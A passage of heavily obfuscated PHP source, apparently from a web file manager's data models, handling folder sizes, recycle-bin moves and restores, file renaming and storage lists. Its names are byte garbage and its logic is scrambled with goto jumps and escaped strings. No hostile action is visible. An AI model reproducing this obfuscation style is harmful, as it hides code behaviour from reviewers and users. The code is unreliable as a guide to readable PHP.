$bÓƒœ®ß‰Å) { $Bãˆã†ó»³[$F×Î…‘ë×] = intval($bÓƒœ®ß‰Å); } $F”° Š¤ = array($f¤¬¯ø¶ã÷[369] => array($f¤¬¯ø¶ã÷[7], $Bãˆã†ó»³)); $bÒ‰ã×§ˆ = array($f¤¬¯ø¶ã÷[524] => USER_ID, $f¤¬¯ø¶ã÷[390] => time()); goto e‚’ÚŠÅğ; e‚’ÚŠÅğ: $this->where($F”° Š¤)->save($bÒ‰ã×§ˆ); goto AµŸÍ¤ã¼; DµÊÉñ–¦Æ: $f¤¬¯ø¶ã÷ =& $_SERVER[Æ]; if (!$Bãˆã†ó»³) { return; } if (!is_array($Bãˆã†ó»³)) { $Bãˆã†ó»³ = array($Bãˆã†ó»³); } goto e•ù¤Æ¯Ü; AµŸÍ¤ã¼: } public function folderSizeReset($EÑ÷³¯±à) { goto cøÜ¼æ±Á¼; Bí‰Ú–‡§: CacheLock::lock($dÌùÕÆ…, 20); $this->sourceCacheClear($EÑ÷³¯±à); $a¶á†Ø‘Óø = $this->sourceInfo($EÑ÷³¯±à); goto C’á±éŞ¥ª; fƒÏÌ¨ë¯ò: $BÒÛ¥…•Ò¥ = $this->parentLevelArray($a¶á†Ø‘Óø[$dçòŞ°¾¯[459]]); if ($BÒÛ¥…•Ò¥) { $a­ç¤É¥óå = array($dçòŞ°¾¯[369] => array($dçòŞ°¾¯[384], $BÒÛ¥…•Ò¥)); if ($BŒÙÒÖù‹Ë < 0) { $a­ç¤É¥óå[$dçòŞ°¾¯[77]] = array($dçòŞ°¾¯[930], abs($BŒÙÒÖù‹Ë)); } $this->where($a­ç¤É¥óå)->setAdd($dçòŞ°¾¯[77], $BŒÙÒÖù‹Ë); } $this->targetSpaceUpdate($a¶á†Ø‘Óø[$dçòŞ°¾¯[371]], $a¶á†Ø‘Óø[$dçòŞ°¾¯[456]]); goto dÜ‘ºÕã‚; cøÜ¼æ±Á¼: $dçòŞ°¾¯ =& $_SERVER[Æ]; if ($this->statusIgnoreResetSpace) { return; } $dÌùÕÆ… = $dçòŞ°¾¯[2352] . $EÑ÷³¯±à; goto Bí‰Ú–‡§; C’á±éŞ¥ª: $a­ç¤É¥óå = array($dçòŞ°¾¯[368] => $EÑ÷³¯±à, $dçòŞ°¾¯[396] => 0); $bÖ¾ÌŞõŠæ = $this->where($a­ç¤É¥óå)->sum($dçòŞ°¾¯[77]); $bÖ¾ÌŞõŠæ = intval($bÖ¾ÌŞõŠæ); goto E”‘®Ê÷Òƒ; E”‘®Ê÷Òƒ: $BŒÙÒÖù‹Ë = $bÖ¾ÌŞõŠæ - intval($a¶á†Ø‘Óø[$dçòŞ°¾¯[77]]); if ($BŒÙÒÖù‹Ë == 0) { return CacheLock::unlock($dÌùÕÆ…); } $this->where(array($dçòŞ°¾¯[383] => $EÑ÷³¯±à))->setField($dçòŞ°¾¯[77], $bÖ¾ÌŞõŠæ); goto fƒÏÌ¨ë¯ò; dÜ‘ºÕã‚: CacheLock::unlock($dÌùÕÆ…); goto cá¸™„Öğ; cá¸™„Öğ: } public function folderSizeResetChildren($cÒï©»ÚêÒ) { goto F’’ÍÅ‡ª‹; BºŞ‡ó„ï—: foreach ($Aóî„­İÇ¸ as $B×Ë»Âß°ƒ) { if ($B×Ë»Âß°ƒ[$f ›²­ëç[77]] == $B×Ë»Âß°ƒ[$f ›²­ëç[2354]]) { continue; } $AŞ¾çÁŒîÆ[] = array($f ›²­ëç[369], $B×Ë»Âß°ƒ[$f ›²­ëç[369]], $f ›²­ëç[77], $B×Ë»Âß°ƒ[$f ›²­ëç[77]]); } $this->saveAll($AŞ¾çÁŒîÆ); goto aÃ®«ÆÉ´; d÷’ˆ˜ô¬: $CÊóÍÂ‰¦ = array($f ›²­ëç[518] => 1, $f ›²­ëç[525] => array($f ›²­ëç[483], $d›Î‘ËÉÃ¦[$f ›²­ëç[459]] . $cÒï©»ÚêÒ . $f ›²­ëç[484])); $aÓ…ÍÂ— = $f ›²­ëç[2353]; $Aóî„­İÇ¸ = $this->field($aÓ…ÍÂ—)->where($CÊóÍÂ‰¦)->select(); goto eÆ‰ÙÈ ‡Û; F’’ÍÅ‡ª‹: $f ›²­ëç =& $_SERVER[Æ]; $this->sourceCacheClear($cÒï©»ÚêÒ); $d›Î‘ËÉÃ¦ = $this->sourceInfo($cÒï©»ÚêÒ); goto d÷’ˆ˜ô¬; eÆ‰ÙÈ ‡Û: $CÊóÍÂ‰¦[$f ›²­ëç[370]] = 0; $e¾í¸©±ôè = $this->field($aÓ…ÍÂ—)->where($CÊóÍÂ‰¦)->select(); if (!$e¾í¸©±ôè) { return; } goto fÌ—çò¼†È; fÌ—çò¼†È: $Aóî„­İÇ¸[] = $d›Î‘ËÉÃ¦; $Aóî„­İÇ¸ = array_to_keyvalue($Aóî„­İÇ¸, $f ›²­ëç[369]); foreach ($Aóî„­İÇ¸ as $CŞ³î’Õâ => $B×Ë»Âß°ƒ) { $Aóî„­İÇ¸[$CŞ³î’Õâ][$f ›²­ëç[2354]] = $Aóî„­İÇ¸[$CŞ³î’Õâ][$f ›²­ëç[77]]; $Aóî„­İÇ¸[$CŞ³î’Õâ][$f ›²­ëç[77]] = 0; } goto b§ÙÇ¸ Ş; b§ÙÇ¸ Ş: foreach ($e¾í¸©±ôè as $B×Ë»Âß°ƒ) { $D¤—œöÄÈ£ = $B×Ë»Âß°ƒ[$f ›²­ëç[461]] . $f ›²­ëç[33]; if (!isset($Aóî„­İÇ¸[$D¤—œöÄÈ£])) { continue; } if ($B×Ë»Âß°ƒ[$f ›²­ëç[397]] == $Aóî„­İÇ¸[$D¤—œöÄÈ£][$f ›²­ëç[397]]) { $Aóî„­İÇ¸[$D¤—œöÄÈ£][$f ›²­ëç[77]] += $B×Ë»Âß°ƒ[$f ›²­ëç[77]]; } } foreach ($Aóî„­İÇ¸ as $B×Ë»Âß°ƒ) { $fä†’ƒ´òØ = $this->parentLevelArray($B×Ë»Âß°ƒ[$f ›²­ëç[459]]); foreach ($fä†’ƒ´òØ as $D¤—œöÄÈ£) { $D¤—œöÄÈ£ = $D¤—œöÄÈ£ . $f ›²­ëç[33]; if (!isset($Aóî„­İÇ¸[$D¤—œöÄÈ£])) { continue; } if ($B×Ë»Âß°ƒ[$f ›²­ëç[397]] == $Aóî„­İÇ¸[$D¤—œöÄÈ£][$f ›²­ëç[397]]) { $Aóî„­İÇ¸[$D¤—œöÄÈ£][$f ›²­ëç[77]] += $B×Ë»Âß°ƒ[$f ›²­ëç[77]]; } } } $AŞ¾çÁŒîÆ = array(); goto BºŞ‡ó„ï—; aÃ®«ÆÉ´: } public function userSpaceReset($e‡é×è„õ‚ = false) { $B¬æ†àŒÔ£ =& $_SERVER[Æ]; $côêÒÔÔ’È = $this->where(array($B¬æ†àŒÔ£[371] => self::TYPE_USER, $B¬æ†àŒÔ£[456] => $e‡é×è„õ‚, $B¬æ†àŒÔ£[370] => 0))->sum($B¬æ†àŒÔ£[77]); Model($B¬æ†àŒÔ£[474])->userEdit($e‡é×è„õ‚, array($B¬æ†àŒÔ£[2087] => $côêÒÔÔ’È)); } public function targetSpaceUpdate($B´Ä¾˜ÙÎ¦, $BÄ¿®£‹Œ‘) { $DğÌ¯º‡ï´ =& $_SERVER[Æ]; if (!$BÄ¿®£‹Œ‘) { return; } if (!in_array($B´Ä¾˜ÙÎ¦, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $f®¨Ü…°ÒÍ = $this->targetSpaceSize($B´Ä¾˜ÙÎ¦, $BÄ¿®£‹Œ‘); if ($B´Ä¾˜ÙÎ¦ == self::TYPE_USER) { Model($DğÌ¯º‡ï´[474])->userEdit($BÄ¿®£‹Œ‘, array($DğÌ¯º‡ï´[2087] => $f®¨Ü…°ÒÍ)); } else { if ($B´Ä¾˜ÙÎ¦ == self::TYPE_GROUP) { Model($DğÌ¯º‡ï´[458])->groupEdit($BÄ¿®£‹Œ‘, array($DğÌ¯º‡ï´[2087] => $f®¨Ü…°ÒÍ)); } } } public function targetSpaceSize($b±É¨®Ş÷, $Dé—÷½äì—) { goto eéŸ“Ùè‰Ö; f¾Ã¤È¢¤—: $C½Í¡¨êÜ = array_to_keyvalue($C½Í¡¨êÜ, $BØ‡Ä•¼„[33], $BØ‡Ä•¼„[369]); $C½Í¡¨êÜ = array_unique(array_filter($C½Í¡¨êÜ)); if ($C½Í¡¨êÜ) { $CÀÜÜô¶íÌ = array($BØ‡Ä•¼„[383] => array($BØ‡Ä•¼„[384], $C½Í¡¨êÜ)); $F‰¦øë°÷« += floatval($this->where($CÀÜÜô¶íÌ)->sum($BØ‡Ä•¼„[77])); } goto Dà‰˜íº÷; f²İâ£: $F‰¦øë°÷« = floatval($cù³ÎÍ·å[$BØ‡Ä•¼„[77]]); $CÀÜÜô¶íÌ = array($BØ‡Ä•¼„[525] => array($BØ‡Ä•¼„[483], $BØ‡Ä•¼„[470] . $cù³ÎÍ·å[$BØ‡Ä•¼„[369]] . $BØ‡Ä•¼„[484])); $C½Í¡¨êÜ = Model($BØ‡Ä•¼„[395])->field($BØ‡Ä•¼„[383])->where($CÀÜÜô¶íÌ)->select(); goto f¾Ã¤È¢¤—; Dà‰˜íº÷: return $F‰¦øë°÷«; goto Aœˆï¬ˆÕ¶; eéŸ“Ùè‰Ö: $BØ‡Ä•¼„ =& $_SERVER[Æ]; $cù³ÎÍ·å = $this->sourceRoot($b±É¨®Ş÷, $Dé—÷½äì—, !0); if (!$cù³ÎÍ·å) { return 0; } goto f²İâ£; Aœˆï¬ˆÕ¶: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($cš”íŠëÚ) { return $this->fileTypeProfile($cš”íŠëÚ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d‰šàÃÍ) { return $this->fileTypeProfile($d‰šàÃÍ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($fõ„ØÖÎß, $f›Òî°Ï…ª) { goto cŞÒŒÂ»‘; cŞÒŒÂ»‘: $dŞ•áˆ¯‰¥ =& $_SERVER[Æ]; $B·“Ê°‹Ì = $dŞ•áˆ¯‰¥[2355] . $fõ„ØÖÎß . $dŞ•áˆ¯‰¥[70] . $f›Òî°Ï…ª; $Cñ³ç³©õÉ = Cache::get($B·“Ê°‹Ì); goto eõ“·¸ÔÄ; C¸ì°’ìŠ: $A„ÅìÓ†³¹ = array(); $A„ÅìÓ†³¹[$dŞ•áˆ¯‰¥[2356]] = array($dŞ•áˆ¯‰¥[2357] => LNG($dŞ•áˆ¯‰¥[2356]), $dŞ•áˆ¯‰¥[2358] => $this->where($C“ŒàœÀ‘à)->count(), $dŞ•áˆ¯‰¥[520] => $this->where($C“ŒàœÀ‘à)->sum($dŞ•áˆ¯‰¥[77])); $eµÇ²ïÊ‰ = KodIO::fileTypeList(); goto fèÜ¿æ ”¼; fèÜ¿æ ”¼: foreach ($eµÇ²ïÊ‰ as $DÏæì«Á => $aÁŒñà‚ˆ) { $C“ŒàœÀ‘à[$dŞ•áˆ¯‰¥[372]] = $this->fileTypeWhere($DÏæì«Á); $A„ÅìÓ†³¹[$DÏæì«Á] = array($dŞ•áˆ¯‰¥[2357] => $aÁŒñà‚ˆ[$dŞ•áˆ¯‰¥[28]], $dŞ•áˆ¯‰¥[2358] => $this->where($C“ŒàœÀ‘à)->count(), $dŞ•áˆ¯‰¥[520] => $this->where($C“ŒàœÀ‘à)->sum($dŞ•áˆ¯‰¥[77])); } Cache::set($B·“Ê°‹Ì, $A„ÅìÓ†³¹, 1200); return $A„ÅìÓ†³¹; goto dÙùÎƒù«; eõ“·¸ÔÄ: if ($Cñ³ç³©õÉ) { return $Cñ³ç³©õÉ; } $C“ŒàœÀ‘à = array($dŞ•áˆ¯‰¥[518] => 0); if ($fõ„ØÖÎß != !1) { $C“ŒàœÀ‘à[$dŞ•áˆ¯‰¥[456]] = $fõ„ØÖÎß; $C“ŒàœÀ‘à[$dŞ•áˆ¯‰¥[371]] = $f›Òî°Ï…ª; } goto C¸ì°’ìŠ; dÙùÎƒù«: } public function fileNameExist($aİ“¼¶³Ù«, $aØ–¶äÃÂ‹) { $b³ÙİÎ¸å„ =& $_SERVER[Æ]; $A¹‘‹×Øã‹ = $this->childList($aİ“¼¶³Ù«); foreach ($A¹‘‹×Øã‹ as $CÅ·ÑØ† ) { if ($CÅ·ÑØ† [$b³ÙİÎ¸å„[28]] == $aØ–¶äÃÂ‹) { return $CÅ·ÑØ† [$b³ÙİÎ¸å„[369]]; } } return !1; } public function childList($cÔ‘õó­†) { goto a··Ö‹¶¡Š; dÊ¹æ©àÜ: $EØÑ½ — = array($Cà¾¯–½Ó[461] => intval($cÔ‘õó­†), $Cà¾¯–½Ó[397] => 0); $B‹»ˆĞÁß = $this->where($EØÑ½ —)->select(); $B‹»ˆĞÁß = $B‹»ˆĞÁß ? $B‹»ˆĞÁß : array(); goto añÓ‡™¯¿; a··Ö‹¶¡Š: $Cà¾¯–½Ó =& $_SERVER[Æ]; $aø®áİ®â = $Cà¾¯–½Ó[2336] . $cÔ‘õó­†; if (isset(self::$cacheChildList[$aø®áİ®â])) { return self::$cacheChildList[$aø®áİ®â]; } goto dÊ¹æ©àÜ; añÓ‡™¯¿: self::$cacheChildList[$aø®áİ®â] = $B‹»ˆĞÁß; foreach ($B‹»ˆĞÁß as $c¼Âˆô‰) { $aø®áİ®â = $Cà¾¯–½Ó[410] . $c¼Âˆô‰[$Cà¾¯–½Ó[369]]; self::$cacheSourceInfo[$aø®áİ®â] = $c¼Âˆô‰; } return $B‹»ˆĞÁß; goto B‹çËˆ¼³æ; B‹çËˆ¼³æ: } public function fileNameAuto($cÃ´Í‹°Üà, $Fß§•¦çã¾, $fê†Ü­ˆŸ® = REPEAT_RENAME, $F…–»ÔÚÚ» = false) { $cåòœÌ·åù =& $_SERVER[Æ]; $f“¡Ô•…Şõ = $this->childList($cÃ´Í‹°Üà); $B“¿”œ‡âæ = array_to_keyvalue($f“¡Ô•…Şõ, $cåòœÌ·åù[33], $cåòœÌ·åù[28]); return $this->fileNameAutoGet($B“¿”œ‡âæ, $Fß§•¦çã¾, $fê†Ü­ˆŸ®, $F…–»ÔÚÚ»); } public function fileNameAutoGet($B íÓ¬œÎ, $b å°ó¯ó¯, $E†«ŞÍï‚Œ, $EĞ’ã¬Ÿ——) { $F¸³ï¹ˆŠ‚ =& $_SERVER[Æ]; if ($E†«ŞÍï‚Œ == REPEAT_REPLACE || !$B íÓ¬œÎ || !in_array_not_case($b å°ó¯ó¯, $B íÓ¬œÎ) || $EĞ’ã¬Ÿ—— && $E†«ŞÍï‚Œ != REPEAT_RENAME_FOLDER) { return $b å°ó¯ó¯; } if ($E†«ŞÍï‚Œ == REPEAT_SKIP) { return !1; } $dæ™›Âİİ˜ = $F¸³ï¹ˆŠ‚[91] . get_path_ext($b å°ó¯ó¯); $dæ™›Âİİ˜ = $dæ™›Âİİ˜ == $F¸³ï¹ˆŠ‚[91] || $EĞ’ã¬Ÿ—— ? $F¸³ï¹ˆŠ‚[33] : $dæ™›Âİİ˜; for ($EÕä¡ùäº  = 1; $EÕä¡ùäº  <= count($B íÓ¬œÎ) + 1; $EÕä¡ùäº ++) { $aï‰ÑŒ¢‡ = substr($b å°ó¯ó¯, 0, strlen($b å°ó¯ó¯) - strlen($dæ™›Âİİ˜)); $CÄÔÌº‹è• = $aï‰ÑŒ¢‡ . "\x28{$EÕä¡ùäº }\51{$dæ™›Âİİ˜}"; if (!in_array_not_case($CÄÔÌº‹è•, $B íÓ¬œÎ)) { return $CÄÔÌº‹è•; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\x63\x65\137\162\x65\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\x54\x69\155\x65", "\164\151\x6d\x65", "\x69\x6e\163\x65\x72\164", "\146\165\x6e\x63\x74\151\x6f\x6e")); public function listData($DŸî¦ğ«èØ = false) { $Fˆƒ¯«ó‹ =& $_SERVER[Æ]; $DŸî¦ğ«èØ = $DŸî¦ğ«èØ ? $DŸî¦ğ«èØ : USER_ID; $b¡öé³›… = $this->where(array($Fˆƒ¯«ó‹[1425] => $DŸî¦ğ«èØ))->select(); return array_to_keyvalue($b¡öé³›…, $Fˆƒ¯«ó‹[33], $Fˆƒ¯«ó‹[369]); } public function moveToRecycle($DÎİìè¾) { goto Dğ´¡à¬Í; Dğ´¡à¬Í: $FÓ˜ÃÏßöŠ =& $_SERVER[Æ]; $c·ªÙÌ†§§ = Model($FÓ˜ÃÏßöŠ[1117]); $EõÍÇÍˆÕŒ = $c·ªÙÌ†§§->sourceInfo($DÎİìè¾); goto AìÅàùó«Ì; fø‰ ò¤À: $this->recycleMove($DÎİìè¾, 1); if ($EõÍÇÍˆÕŒ[$FÓ˜ÃÏßöŠ[370]] == $FÓ˜ÃÏßöŠ[83]) { $F‡½Úóİ£ = array($FÓ˜ÃÏßöŠ[525] => array($FÓ˜ÃÏßöŠ[483], $EõÍÇÍˆÕŒ[$FÓ˜ÃÏßöŠ[459]] . $DÎİìè¾ . $FÓ˜ÃÏßöŠ[484])); $c·ªÙÌ†§§->where($F‡½Úóİ£)->setField($FÓ˜ÃÏßöŠ[397], 1); } goto EÖ¹ºøóæã; AìÅàùó«Ì: if (!$EõÍÇÍˆÕŒ || $EõÍÇÍˆÕŒ[$FÓ˜ÃÏßöŠ[397]] == $FÓ˜ÃÏßöŠ[83]) { return; } $b’´–¡Éá = array($FÓ˜ÃÏßöŠ[383] => $DÎİìè¾, $FÓ˜ÃÏßöŠ[1425] => USER_ID, $FÓ˜ÃÏßöŠ[521] => $EõÍÇÍˆÕŒ[$FÓ˜ÃÏßöŠ[371]], $FÓ˜ÃÏßöŠ[522] => $EõÍÇÍˆÕŒ[$FÓ˜ÃÏßöŠ[456]], $FÓ˜ÃÏßöŠ[525] => $EõÍÇÍˆÕŒ[$FÓ˜ÃÏßöŠ[459]]); $this->add($b’´–¡Éá); goto fø‰ ò¤À; EÖ¹ºøóæã: } public function clear() { $this->remove(!1); } public function remove($aµÇª†ÔŒ” = false) { goto e¯ğŞøé‡‘; cµãùŒ§Ô£: $aµÇª†ÔŒ” = $aµÇª†ÔŒ” === !1 ? !1 : $aµÇª†ÔŒ”; $f¡˜ËÖó£ = array(); foreach ($AÜÀœÌÎ­´ as $EÑ”ğ¿Ü) { if ($aµÇª†ÔŒ” != !1 && !in_array($EÑ”ğ¿Ü, $aµÇª†ÔŒ”)) { continue; } $AÛêİß’->remove($EÑ”ğ¿Ü, !1); $f¥œ±ÏäÙÃ = $this->where(array($DÂè…ÏÏö[369] => $EÑ”ğ¿Ü))->find(); $F‘˜º‘¦²š = $f¥œ±ÏäÙÃ[$DÂè…ÏÏö[371]] . $DÂè…ÏÏö[70] . $f¥œ±ÏäÙÃ[$DÂè…ÏÏö[456]]; $f¡˜ËÖó£[$F‘˜º‘¦²š] = array($DÂè…ÏÏö[521] => $f¥œ±ÏäÙÃ[$DÂè…ÏÏö[371]], $DÂè…ÏÏö[456] => $f¥œ±ÏäÙÃ[$DÂè…ÏÏö[456]]); $this->where(array($DÂè…ÏÏö[369] => $EÑ”ğ¿Ü))->delete(); } goto e•¡ßØêÔ¬; e¯ğŞøé‡‘: $DÂè…ÏÏö =& $_SERVER[Æ]; $AÛêİß’ = Model($DÂè…ÏÏö[1117]); $AÜÀœÌÎ­´ = $this->listData(); goto cµãùŒ§Ô£; e•¡ßØêÔ¬: foreach ($f¡˜ËÖó£ as $F¾³ù¤éù¨) { $AÛêİß’->targetSpaceUpdate($F¾³ù¤éù¨[$DÂè…ÏÏö[371]], $F¾³ù¤éù¨[$DÂè…ÏÏö[456]]); } goto fÈÕ§ÖîÁ„; fÈÕ§ÖîÁ„: } public function restore($b·ĞÙØó¹… = false) { goto fâóÂº»; A”á²êë’†: foreach ($EÆÖÄ¹¹ğ­ as $d¿¹Óäİ¶) { goto Cƒå•«¹âƒ; bß­ğ—ØÖ: if ($eÛ²øµõå[$Añì®µØÙå[397]] == $Añì®µØÙå[83]) { continue; } $b»®’²¦ì->lockMoveStart($d¿¹Óäİ¶); $this->recycleMove($d¿¹Óäİ¶, 0); goto B®…›¢Ñ¿á; f¼Å°»Œ§: $F˜áÚò‚ÚŒ[] = $b¿ñ•»‘[$Añì®µØÙå[461]]; if ($b¿ñ•»‘[$Añì®µØÙå[370]] == $Añì®µØÙå[83]) { $F˜áÚò‚ÚŒ[] = $d¿¹Óäİ¶; } $b»®’²¦ì->lockMoveEnd($d¿¹Óäİ¶); goto EÊøÛÉ‰²ˆ; Cƒå•«¹âƒ: if ($b·ĞÙØó¹… != !1 && !in_array($d¿¹Óäİ¶, $b·ĞÙØó¹…)) { continue; } $b¿ñ•»‘ = $b»®’²¦ì->sourceInfo($d¿¹Óäİ¶); $eÛ²øµõå = $b»®’²¦ì->sourceInfo($b¿ñ•»‘[$Añì®µØÙå[461]]); goto bß­ğ—ØÖ; B®…›¢Ñ¿á: if ($b¿ñ•»‘[$Añì®µØÙå[370]] == $Añì®µØÙå[83]) { $dºá¢Şà‰Š = array($Añì®µØÙå[525] => array($Añì®µØÙå[483], $b¿ñ•»‘[$Añì®µØÙå[459]] . $d¿¹Óäİ¶ . $Añì®µØÙå[484])); $b»®’²¦ì->where($dºá¢Şà‰Š)->setField($Añì®µØÙå[397], 0); $this->restoreFolderChildren($d¿¹Óäİ¶, $EÆÖÄ¹¹ğ­); } $this->where(array($Añì®µØÙå[369] => $d¿¹Óäİ¶))->delete(); $b»®’²¦ì->folderSizeReset($b¿ñ•»‘[$Añì®µØÙå[461]]); goto f¼Å°»Œ§; EÊøÛÉ‰²ˆ: } $b»®’²¦ì->updateModifyTime($F˜áÚò‚ÚŒ); goto b ¬öŒµ‹; aö”èê„Á: $b·ĞÙØó¹… = $b·ĞÙØó¹… == !1 ? !1 : $b·ĞÙØó¹…; if (!$EÆÖÄ¹¹ğ­) { return !0; } $F˜áÚò‚ÚŒ = array(); goto A”á²êë’†; fâóÂº»: $Añì®µØÙå =& $_SERVER[Æ]; $b»®’²¦ì = Model($Añì®µØÙå[1117]); $EÆÖÄ¹¹ğ­ = $this->listData(); goto aö”èê„Á; b ¬öŒµ‹: } private function restoreFolderChildren($Dœ„©ò¶„Ñ, $e…°–¸) { goto dÊ£•èÔˆÊ; d¡ç–¿Éù”: foreach ($e…°–¸ as $b¶ŒŒæ Ìè) { if ($b¶ŒŒæ Ìè == $Dœ„©ò¶„Ñ) { continue; } if (!$d”ùÃä˜¸->isParentOf($Dœ„©ò¶„Ñ, $b¶ŒŒæ Ìè)) { continue; } $eØÔ«¥© ª = $d”ùÃä˜¸->sourceInfo($b¶ŒŒæ Ìè); if ($eØÔ«¥© ª[$AÜ¾ìÄì¢[370]] == $AÜ¾ìÄì¢[83]) { $EÑ«‡‰©ÖÔ[] = array($AÜ¾ìÄì¢[525] => array($AÜ¾ìÄì¢[483], $eØÔ«¥© ª[$AÜ¾ìÄì¢[459]] . $b¶ŒŒæ Ìè . $AÜ¾ìÄì¢[484])); } else { $EÑ«‡‰©ÖÔ[$AÜ¾ìÄì¢[369]][1][] = $b¶ŒŒæ Ìè; } } if (!$EÑ«‡‰©ÖÔ[$AÜ¾ìÄì¢[369]][1]) { unset($EÑ«‡‰©ÖÔ[$AÜ¾ìÄì¢[369]]); } if (!$EÑ«‡‰©ÖÔ) { return; } goto a£˜´Ûæõé; a£˜´Ûæõé: $EÑ«‡‰©ÖÔ[$AÜ¾ìÄì¢[369]][1] = array_unique($EÑ«‡‰©ÖÔ[$AÜ¾ìÄì¢[369]][1]); $EÑ«‡‰©ÖÔ[$AÜ¾ìÄì¢[915]] = $AÜ¾ìÄì¢[2181]; $d”ùÃä˜¸->where($EÑ«‡‰©ÖÔ)->setField($AÜ¾ìÄì¢[397], 1); goto dÃö”Ê„—ò; dÊ£•èÔˆÊ: $AÜ¾ìÄì¢ =& $_SERVER[Æ]; $d”ùÃä˜¸ = Model($AÜ¾ìÄì¢[1117]); $EÑ«‡‰©ÖÔ = array($AÜ¾ìÄì¢[369] => array($AÜ¾ìÄì¢[7], array())); goto d¡ç–¿Éù”; dÃö”Ê„—ò: } private function recycleMove($BÀ­åÖç¶–, $DÁÑÀ“ÌÆê = 1) { $dº„ŠÃëÄ® =& $_SERVER[Æ]; $dÏƒõœ›ÍÂ = Model($dº„ŠÃëÄ®[1117]); $Fà‚å‘×‚à = Model($dº„ŠÃëÄ®[2359]); $FÎ²«¸ÀÂ = array($dº„ŠÃëÄ®[369] => $BÀ­åÖç¶–); if ($DÁÑÀ“ÌÆê) { $dÏƒõœ›ÍÂ->where($FÎ²«¸ÀÂ)->setField($dº„ŠÃëÄ®[397], 1); $Fà‚å‘×‚à->eventRecycle($BÀ­åÖç¶–, $dº„ŠÃëÄ®[2360]); } else { $a®­Æšø‚Á = $dÏƒõœ›ÍÂ->where($FÎ²«¸ÀÂ)->find(); $a„‹¶ŒãÄö = $a®­Æšø‚Á[$dº„ŠÃëÄ®[370]] == $dº„ŠÃëÄ®[83]; $b‰¨‚¿Ãª = $dÏƒõœ›ÍÂ->fileNameAuto($a®­Æšø‚Á[$dº„ŠÃëÄ®[461]], $a®­Æšø‚Á[$dº„ŠÃëÄ®[28]], REPEAT_RENAME_FOLDER, $a„‹¶ŒãÄö); if ($b‰¨‚¿Ãª != $a®­Æšø‚Á[$dº„ŠÃëÄ®[28]]) { $dÏƒõœ›ÍÂ->rename($BÀ­åÖç¶–, $b‰¨‚¿Ãª); } $dÏƒõœ›ÍÂ->where($FÎ²«¸ÀÂ)->setField($dº„ŠÃëÄ®[397], 0); $Fà‚å‘×‚à->eventRecycle($BÀ­åÖç¶–, $dº„ŠÃëÄ®[2361]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\163\x74\157\x72\141\x67\x65\114\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\x73\x69\x7a\145\115\x61\x78", "\163\x79\x73\x74\x65\155", "\x64\x65\x66\141\165\x6c\x74", "\x64\x72\x69\x76\x65\162", "\x63\157\156\x66\x69\x67"); public function listData($A—§…”£÷ = false, $BÔÒÌÉ ”Ã = "\155\157\x64\x69\x66\171\124\x69\x6d\x65", $EŞ§§»²³› = false) { goto E“Üèã©Å; F™Ûé«áÂ÷: return $b¼çßïöÏ; goto a¯Šé®ñ‘­; C’£›ó¦µ: foreach ($b¼çßïöÏ as $A¸òÆ›Ï‰¸ => $Aœ™¹’‡) { unset($b¼çßïöÏ[$A¸òÆ›Ï‰¸][$d¢²’‚ˆ‡[6]]); $b¼çßïöÏ[$A¸òÆ›Ï‰¸][$d¢²’‚ˆ‡[2087]] = 0; } $e±ÌÔğÛÀ = array_to_keyvalue($b¼çßïöÏ, $d¢²’‚ˆ‡[33], $d¢²’‚ˆ‡[367]); $this->_listAppendSize($b¼çßïöÏ, $e±ÌÔğÛÀ); goto F™Ûé«áÂ÷; E“Üèã©Å: $d¢²’‚ˆ‡ =& $_SERVER[Æ]; $b¼çßïöÏ = parent::listData($A—§…”£÷, $BÔÒÌÉ ”Ã, $EŞ§§»²³›); if ($A—§…”£÷) { return $b¼çßïöÏ; } goto C’£›ó¦µ; a¯Šé®ñ‘­: } public function _listAppendSize(&$aÅèŸº‹‹¼, $Eƒ½ÄÈ‰àò) { $cîÙ…­ºŠÌ =& $_SERVER[Æ]; if (!$Eƒ½ÄÈ‰àò) { return; } $Eë­±ïÓ˜Š = $cîÙ…­ºŠÌ[2362] . implode($cîÙ…­ºŠÌ[47], $Eƒ½ÄÈ‰àò) . $cîÙ…­ºŠÌ[2363]; $FíÎÅÙ¹ˆ = Model($cîÙ…­ºŠÌ[717])->query($Eë­±ïÓ˜Š); $FíÎÅÙ¹ˆ = array_to_keyvalue($FíÎÅÙ¹ˆ, $cîÙ…­ºŠÌ[367], $cîÙ…­ºŠÌ[77]); foreach ($aÅèŸº‹‹¼ as $cŞèíŞ£À™ => $Eã•³‘ÁÊé) { $aÅèŸº‹‹¼[$cŞèíŞ£À™][$cîÙ…­ºŠÌ[2087]] = isset($FíÎÅÙ¹ˆ[$Eã•³‘ÁÊé[$cîÙ…­ºŠÌ[367]]]) ? $FíÎÅÙ¹ˆ[$Eã•³‘ÁÊé[$cîÙ…­ºŠÌ[367]]] : 0; } } public function getConfig($d”ÃØ–Â) { $cÄÅŒ„ïß = parent::listData($d”ÃØ–Â); return json_decode($cÄÅŒ„ïß[$_SERVER[Æ][6]], !0); } public function update($dßÉÍÆåêÜ, $bİÖÍ¿ÅÈ) { goto f†’ÊèÃ‹; aÎ×ÈÍ‚Ñ: if (isset($Bç¥ŒµÍ¥æ[$f‰êÎì›º]) && $Bç¥ŒµÍ¥æ[$f‰êÎì›º][$BÕ°æø’£“[367]] != $dßÉÍÆåêÜ) { return !1; } if (isset($bİÖÍ¿ÅÈ[$BÕ°æø’£“[2364]]) && $bİÖÍ¿ÅÈ[$BÕ°æø’£“[2364]] == $BÕ°æø’£“[83]) { $this->checkConfig($bİÖÍ¿ÅÈ); } unset($bİÖÍ¿ÅÈ[$BÕ°æø’£“[2364]]); goto Aœ±é’ãŒ‹; f†’ÊèÃ‹: $BÕ°æø’£“ =& $_SERVER[Æ]; $f‰êÎì›º = $bİÖÍ¿ÅÈ[$BÕ°æø’£“[28]]; $Bç¥ŒµÍ¥æ = array_to_keyvalue(parent::listData(), $BÕ°æø’£“[28]); goto aÎ×ÈÍ‚Ñ; Aœ±é’ãŒ‹: $fçƒ¢ä¬±¯ = parent::update($dßÉÍÆåêÜ, $bİÖÍ¿ÅÈ); if ($fçƒ¢ä¬±¯ && 